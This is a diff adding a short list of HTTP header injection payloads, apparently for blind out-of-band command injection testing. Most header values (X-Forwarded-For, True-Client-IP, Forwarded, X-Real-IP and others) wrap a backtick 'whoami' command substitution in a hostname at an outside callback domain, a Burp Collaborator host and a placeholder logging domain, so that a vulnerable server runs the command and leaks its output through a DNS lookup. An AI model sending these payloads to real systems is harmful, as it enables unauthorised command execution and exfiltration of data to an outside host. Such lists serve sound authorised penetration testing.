@@ -1,0 +1,10 @@
+True-Client-IP: `whoami`.randkey.youlogdomain.com 
+Forwarded:
+for=`whoami`.gg0qyju6tkxhwh1nyc6pazh6mxs1gq.burpcollaborator.net;by=`whoami`.gg0qyju6tkxhwh1nyc6pazh6m
+xs1gq.burpcollaborator.net;host=`whoami`randkey.youlogdomain.com
+From:root@randkey.youlogdomain.com
+X-Real-IP: `whoami`.randkey.youlogdomain.com
+X-Wap-Profile: http://randkey.youlogdomain.com/wap.xml
+Client-IP: `whoami`.randkey.youlogdomain.com
+Referer: http://randkey.youlogdomain.com/ref X-Forwarded-For: `whoami`.randkey.youlogdomain.com Contact: root@randkey.youlogdomain.com
+X-Client-IP: `whoami`.randkey.youlogdomain.com X-Originating-IP: `whoami`.randkey.youlogdomain.com Proxy:`whoami`.randkey.youlogdomain.com
